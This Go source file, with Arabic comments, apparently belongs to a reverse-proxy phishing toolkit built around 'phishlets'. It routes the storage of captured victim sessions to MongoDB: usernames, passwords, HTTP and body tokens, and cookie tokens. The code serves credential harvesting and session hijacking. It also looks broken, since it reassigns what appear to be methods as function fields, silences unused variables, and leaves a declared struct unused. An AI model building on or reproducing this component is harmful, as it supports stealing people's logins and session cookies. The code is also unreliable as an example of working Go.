package database

import (
	"fmt"
)

// MongoForwarder هو wrapper يسمح بتحويل عمليات MongoDatabase إلى Database
// حتى يتمكن core من استخدامها بدون تغيير واسع النطاق
type MongoForwarder struct {
	Mongo *MongoDatabase
}

// NewMongoForwarder ينشئ wrapper جديد للاستخدام في core
func NewMongoForwarder(mongo *MongoDatabase) *Database {
	db := &Database{
		path: fmt.Sprintf("mongodb://%s", mongo.client.ConnectString()),
		db:   nil, // بدون bundb
	}
	
	// استبدال الوظائف
	originalCreateSession := db.CreateSession
	db.CreateSession = func(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
		return mongo.CreateSession(sid, phishlet, landing_url, useragent, remote_addr)
	}
	
	originalListSessions := db.ListSessions
	db.ListSessions = func() ([]*Session, error) {
		return mongo.ListSessions()
	}
	
	originalSetSessionUsername := db.SetSessionUsername
	db.SetSessionUsername = func(sid string, username string) error {
		return mongo.SetSessionUsername(sid, username)
	}
	
	originalSetSessionPassword := db.SetSessionPassword
	db.SetSessionPassword = func(sid string, password string) error {
		return mongo.SetSessionPassword(sid, password)
	}
	
	originalSetSessionCustom := db.SetSessionCustom
	db.SetSessionCustom = func(sid string, name string, value string) error {
		return mongo.SetSessionCustom(sid, name, value)
	}
	
	originalSetSessionBodyTokens := db.SetSessionBodyTokens
	db.SetSessionBodyTokens = func(sid string, tokens map[string]string) error {
		return mongo.SetSessionBodyTokens(sid, tokens)
	}
	
	originalSetSessionHttpTokens := db.SetSessionHttpTokens
	db.SetSessionHttpTokens = func(sid string, tokens map[string]string) error {
		return mongo.SetSessionHttpTokens(sid, tokens)
	}
	
	originalSetSessionCookieTokens := db.SetSessionCookieTokens
	db.SetSessionCookieTokens = func(sid string, tokens map[string]map[string]*CookieToken) error {
		return mongo.SetSessionCookieTokens(sid, tokens)
	}
	
	originalDeleteSession := db.DeleteSession
	db.DeleteSession = func(sid string) error {
		return mongo.DeleteSession(sid)
	}
	
	originalGetSessionById := db.GetSessionById
	db.GetSessionById = func(id int) (*Session, error) {
		return mongo.GetSessionById(id)
	}
	
	originalGetSessionBySid := db.GetSessionBySid
	db.GetSessionBySid = func(sid string) (*Session, error) {
		return mongo.GetSessionBySid(sid)
	}
	
	originalClose := db.Close
	db.Close = func() error {
		return mongo.Close()
	}
	
	originalDeleteSessionById := db.DeleteSessionById
	db.DeleteSessionById = func(id int) error {
		return mongo.DeleteSessionById(id)
	}
	
	originalFlush := db.Flush
	db.Flush = func() {
		mongo.Flush()
	}
	
	// تجاهل المتغيرات غير المستخدمة لتجنب الأخطاء التجميعية
	_ = originalCreateSession
	_ = originalListSessions
	_ = originalSetSessionUsername
	_ = originalSetSessionPassword
	_ = originalSetSessionCustom
	_ = originalSetSessionBodyTokens
	_ = originalSetSessionHttpTokens
	_ = originalSetSessionCookieTokens
	_ = originalDeleteSession
	_ = originalGetSessionById
	_ = originalGetSessionBySid
	_ = originalClose
	_ = originalDeleteSessionById
	_ = originalFlush
	
	return db
} 